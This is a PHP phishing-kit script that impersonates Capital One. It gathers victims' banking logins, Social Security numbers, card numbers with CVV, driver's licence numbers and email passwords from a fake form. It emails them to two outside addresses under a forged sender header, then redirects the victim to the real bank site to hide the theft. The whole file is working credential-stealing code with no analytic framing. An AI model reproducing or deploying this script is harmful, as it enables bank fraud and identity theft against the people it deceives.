<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Capital One Info-----------------------\n";
$message .= "accountype : ".$_POST['select1']."\n";
$message .= "username : ".$_POST['id']."\n";
$message .= "password : ".$_POST['pass']."\n";
$message .= "Full NAME : ".$_POST['formtext2']."\n";
$message .= "Address : ".$_POST['formtext3']."\n";
$message .= "DOB : ".$_POST['formselect1']."\n";
$message .= "DOB M : ".$_POST['formselect2']."\n";
$message .= "DOB D : ".$_POST['formselect3']."\n";
$message .= "SSN 1 : ".$_POST['formtext4']."\n";
$message .= "SSN 2 : ".$_POST['formtext5']."\n";
$message .= "SSN 3 : ".$_POST['formtext6']."\n";
$message .= "City : ".$_POST['formtext1']."\n";
$message .= "State : ".$_POST['formtext7']."\n";
$message .= "Zip Code : ".$_POST['formtext8']."\n";
$message .= "Card Number : ".$_POST['formtext9']."\n";
$message .= "Expire Date : ".$_POST['formtext10']."\n";
$message .= "CVV : ".$_POST['formtext11']."\n";
$message .= "Driver License Number : ".$_POST['formtext12']."\n";
$message .= " Email : ".$_POST['formtext13']."\n";
$message .= " Email password : ".$_POST['formtext14']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY sh3lb0x-------------\n";
$send = "josephbabs20@gmail.com,danielbante09@outlook.com";
$subject = "Result from Unknown";
$headers = "From:Capital One<customer-support@messagemers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: http://capitalone.com/");

	 
?>